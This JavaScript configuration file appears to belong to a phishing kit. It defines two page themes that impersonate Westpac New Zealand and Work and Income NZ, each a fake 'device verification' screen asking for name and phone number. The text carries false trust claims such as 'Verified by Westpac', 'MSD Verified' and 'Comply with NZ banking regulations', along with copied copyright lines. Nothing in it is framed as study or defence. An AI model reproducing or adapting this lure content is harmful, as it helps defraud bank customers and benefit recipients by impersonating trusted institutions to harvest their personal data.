window.themes = {
    westpac: {
        name: "Westpac",
        logo: "./assets/westpac-logo.png",
        primaryColor: "#DA1710",
        secondaryColor: "#B5140E",
        styles: "themes/westpac.css",
        content: {
            title: "Device Verification Required",
            message: "Please verify your device to continue",
            subMessage: "To comply with recent banking regulations and ensure your account security, we need to verify this device.",
            buttonText: "Verify Device",
            badges: [
                { icon: "🔒", text: "Bank-Grade Security" },
                { icon: "✓", text: "Verified by Westpac" }
            ],
            formFields: {
                firstName: {
                    label: "First Name",
                    placeholder: "Enter your first name"
                },
                lastName: {
                    label: "Last Name",
                    placeholder: "Enter your last name"
                },
                phone: {
                    label: "Phone Number",
                    placeholder: "021234567 or +64212345678"
                }
            },
            infoBox: {
                title: "Why is this required?",
                points: [
                    "Protect against unauthorized access",
                    "Comply with NZ banking regulations",
                    "Ensure secure transactions"
                ]
            },
            footer: {
                copyright: "© 2024 Westpac New Zealand Limited. All rights reserved.",
                links: [
                    { text: "Privacy", url: "#" },
                    { text: "Security", url: "#" },
                    { text: "Terms of Use", url: "#" }
                ]
            }
        }
    },
    winz: {
        name: "Work and Income NZ",
        logo: "./assets/logo-winz.svg",
        primaryColor: "#0066CC",
        secondaryColor: "#004C99",
        styles: "themes/winz.css",
        content: {
            title: "Device Security Check",
            message: "Verify your device to access your benefits",
            subMessage: "To protect your personal information and ensure secure access to your payments and benefits, we need to verify this device.",
            buttonText: "Verify Device",
            badges: [
                { icon: "🔒", text: "Government Security" },
                { icon: "✓", text: "MSD Verified" }
            ],
            formFields: {
                firstName: {
                    label: "First Name",
                    placeholder: "Enter your first name"
                },
                lastName: {
                    label: "Last Name",
                    placeholder: "Enter your last name"
                },
                phone: {
                    label: "Contact Number",
                    placeholder: "021234567 or +64212345678"
                }
            },
            infoBox: {
                title: "Why do we need to verify your device?",
                points: [
                    "Protect your benefit payments and personal details",
                    "Ensure secure access to MyMSD",
                    "Prevent unauthorized changes to your information"
                ]
            },
            footer: {
                copyright: "© 2024 Ministry of Social Development. All rights reserved.",
                links: [
                    { text: "Privacy", url: "#" },
                    { text: "Security", url: "#" },
                    { text: "Contact Us", url: "#" }
                ]
            }
        }
    }
};
